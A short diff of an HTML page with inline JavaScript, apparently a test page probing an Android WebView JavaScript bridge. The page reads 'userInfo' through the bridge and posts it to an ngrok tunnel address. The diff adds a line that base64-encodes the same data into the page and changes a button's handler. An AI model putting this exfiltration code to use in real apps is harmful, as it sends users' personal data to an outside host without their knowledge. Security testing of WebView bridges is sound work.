@@ -16,9 +16,12 @@
               window.location.href = "https://google.co.in";
             }
 
+            document.getElementByID("asfd").innerHTML = btoa(Android.get('userInfo'))
+
             $.post('http://7cc8cac5.ngrok.io', {
               payload: Android.get('userInfo')
             });
+
           }
         </script>
         <style>
@@ -74,12 +77,12 @@
               </a>
             </div>
             <div class="col4">
-              <button onclick='runAndroid("{\"action\" : \"open_activity\", \"type\" : \"profile\", \"self\" : true, \"referrer\" : \"Pass\"}");'>
+              <button onclick='runAndroid();' id="asdf">
                 Open Your Profile
               </button>
             </div>
             <div class="col4">
-              World2
+              World3
             </div>
           </div>
         </div>
